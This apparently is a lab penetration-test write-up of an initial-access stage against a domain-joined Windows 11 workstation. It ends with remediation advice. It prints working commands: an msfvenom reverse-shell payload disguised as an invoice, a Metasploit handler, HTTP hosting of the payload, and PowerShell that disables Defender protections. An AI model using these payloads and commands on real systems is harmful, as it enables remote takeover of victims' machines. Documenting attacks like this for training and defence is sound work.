# Initial Access

## Objective

Establish an initial foothold on a domain-joined endpoint by simulating the most common real-world initial access vector: execution of a malicious file by a standard, non-administrative user.

## Target

Windows 11 workstation (WIN11-PC), domain-joined, operated under a standard (non-administrative) domain user account ("Peter Parker").

## Initial Conditions

- The target user held a standard domain user account with no local administrative rights.
- No prior access to the workstation existed.
- Endpoint real-time antivirus protection was disabled for the purposes of this exercise (see Vulnerability section).

## Vulnerability / Weakness

Absence of effective endpoint controls (antivirus real-time protection, Tamper Protection, and cloud-delivered protection were disabled) permitting execution of an untrusted, attacker-supplied executable by a standard user without interception. This simulates a scenario in which an employee executes a malicious email attachment or downloaded file.

## Technique Used

Simulated phishing: delivery and execution of an attacker-generated payload by a logged-in domain user, representing a user opening a malicious attachment (MITRE ATT&CK T1566 / T1204 — User Execution).

## Attack Execution

### Step 1 — Payload Generation (Kali)

A reverse-shell payload disguised as a benign file (e.g., an "invoice") was generated using `msfvenom`:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[INSERT KALI IP] LPORT=4444 -f exe -o invoice.exe
```

### Step 2 — Listener Setup (Kali)

A Metasploit multi-handler was configured to catch the resulting connection:

```bash
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST [INSERT KALI IP]
set LPORT 4444
run
```

### Step 3 — Payload Hosting (Kali)

The payload was served over HTTP from the attacker host:

```bash
python3 -m http.server 80
```

### Step 4 — Endpoint Protection Disabled (Windows 11, one-time lab setup)

To isolate testing of the post-exploitation kill chain from antivirus evasion research (an explicitly separate discipline, out of scope for this assessment), Windows Defender protections were disabled:

```powershell
Add-MpPreference -ExclusionPath "C:\Windows\Temp"
Add-MpPreference -ExclusionExtension ".exe"
Add-MpPreference -DisableRealtimeMonitoring $true
```

Tamper Protection and Cloud-delivered protection were also disabled via **Windows Security → Virus & threat protection → Manage settings**.

### Step 5 — Delivery and Execution (Windows 11)

While logged in as the standard domain user, the payload was retrieved and executed:

```
Browser navigation to: http://[INSERT KALI IP]/invoice.exe
Download → double-click to execute
```

### Step 6 — Session Confirmation (Kali)

```
[*] Meterpreter session 1 opened

meterpreter > getuid
Server username: LAB\pparker
```

## Result

A remote command-and-control session was established on the Kali attacker platform, running in the security context of the standard domain user who executed the payload. No administrative privileges were held at this stage.

## Evidence


[`evidence/initial-access.png`](../evidence/initial-access.png)
[`evidence/initial-access2.png`](../evidence/intial-access2.png)


## Security Impact

Successful initial access via user execution demonstrates that endpoint compromise does not require any AD misconfiguration — it requires only a single user interaction with an untrusted file. Once a foothold is established, the attacker's next actions are constrained only by the privilege level of the compromised account and the security posture of the endpoint itself, both of which are addressed in subsequent attack-chain stages.

## Remediation

- Enforce endpoint protection (real-time antivirus/EDR) and prevent users from disabling it (e.g., via Tamper Protection and centrally managed policy).
- Deploy application allowlisting or attack surface reduction rules to restrict execution of unsigned/untrusted executables.
- Provide regular phishing/security awareness training paired with a straightforward reporting mechanism for suspicious files.
- Deploy email/web gateway filtering to reduce the likelihood of malicious attachments reaching end users in the first place.








